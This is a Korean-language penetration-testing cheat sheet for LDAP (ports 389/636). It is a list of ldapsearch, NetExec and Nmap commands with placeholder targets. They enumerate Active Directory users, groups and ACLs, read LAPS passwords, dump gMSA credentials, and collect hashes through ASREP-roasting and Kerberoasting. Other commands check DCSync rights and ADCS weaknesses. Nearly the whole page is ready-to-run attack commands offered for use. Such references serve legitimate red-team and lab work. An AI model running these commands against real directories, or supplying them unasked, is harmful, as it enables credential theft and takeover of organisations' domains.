---
sidebar_position: 13
---

# LDAP - 389/636

## 기본 정보

**포트**: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog)

LDAP(Lightweight Directory Access Protocol)는 디렉토리 서비스 접근을 위한 프로토콜입니다.

## ldapsearch

```bash
# Naming Contexts 확인
ldapsearch -x -h <RHOST> -s base namingcontexts

# 기본 정보 조회
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +

# LDAPS (보안 LDAP)
ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +

# 도메인 조회
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<DOMAIN>,DC=local"

# Description 필드 검색
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<DOMAIN>,DC=local" | grep descr -A 3 -B 3

# DN 목록만 추출
ldapsearch -x -h <RHOST> -b "dc=<DOMAIN>,dc=local" "*" | awk '/dn: / {print $2}'

# LAPS 비밀번호 조회
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# Info 필드 검색
ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<DOMAIN>,DC=local" | grep info
```

## NetExec LDAP

### 도메인 열거

```bash
# 사용자 열거
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --users-export <FILE>

# 활성 사용자만
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --active-users

# 그룹 열거
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --groups "<GROUP>"

# Admin Count 확인
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --admin-count

# 특정 쿼리
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(adminCount=1)" "sAMAccountName"

# 모듈
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M maq
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ldap-checker
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M whoami

# BloodHound 데이터 수집
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dns-server <RHOST> -c All
```

### Domain SID 찾기

```bash
netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
```

### LDAP 쿼리

```bash
# Administrator 계정 조회
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" ""

# 특정 속성 조회
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
```

### DACL 열거

```bash
# 기본 읽기
netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read

# 특정 Principal
netexec ldap -k --kdcHost <RHOST> -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=<USERNAME>

# DCSync 권한 확인
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET_DN="DC=<DOMAIN>,DC=<DOMAIN>" ACTION=read RIGHTS=DCSync

# Denied ACE 확인
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied

# 백업
netexec ldap -k --kdcHost <RHOST> -M daclread -M daclread -o TARGET=../../<FILE> ACTION=backup
```

### 자격증명 덤프

```bash
# GMSA
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k

# GMSA ID 변환
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>

# GMSA LSA 복호화
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
```

### ASREPRoast

```bash
# 기본
netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast

# 자격증명 사용
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast

# KDC 지정
netexec ldap <RHOST> -u '<USERNAME>' -p '' --asreproast hashes.asreproast --kdcHost <DOMAIN>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast --kdcHost <DOMAIN>
```

### Kerberoasting

```bash
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
```

### Delegation

```bash
# 위임 찾기
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation

# Unconstrained Delegation
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation
```

### AD CS

```bash
# ADCS 열거
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M adcs -o SERVER=<RHOST>
```

## Nmap

```bash
# LDAP 버전 확인
sudo nmap -p389,636 -sV <RHOST>

# LDAP 정보 수집
sudo nmap -p389 --script ldap-rootdse <RHOST>

# LDAP 검색
sudo nmap -p389 --script ldap-search <RHOST>
```

## 참고

- 익명 바인딩 확인
- Null 자격증명 시도
- ASREPRoast, Kerberoasting 공격
- LAPS 비밀번호 확인
- BloodHound 데이터 수집
- ADCS 취약점 확인
